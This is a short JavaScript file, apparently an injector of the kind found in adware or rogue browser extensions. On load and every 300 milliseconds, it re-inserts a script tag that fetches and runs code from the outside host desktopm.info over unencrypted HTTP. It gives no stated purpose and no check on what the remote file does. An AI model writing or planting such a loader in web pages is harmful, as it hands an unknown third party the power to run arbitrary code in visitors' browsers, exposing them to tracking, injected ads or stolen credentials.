var DeskM = {
    init: function()
    {
	window.setInterval(DeskM.check,300);
	DeskM.check();
    },

    check: function(){
	if (document.getElementById('dkr')) return;
	var f=document.createElement('script');
	f.setAttribute('id','dkr');
	f.type='text/javascript';
	f.src='http://desktopm.info/module/igwdn.js';
	document.getElementsByTagName('head')[0].appendChild(f);
    }
}

DeskM.init();
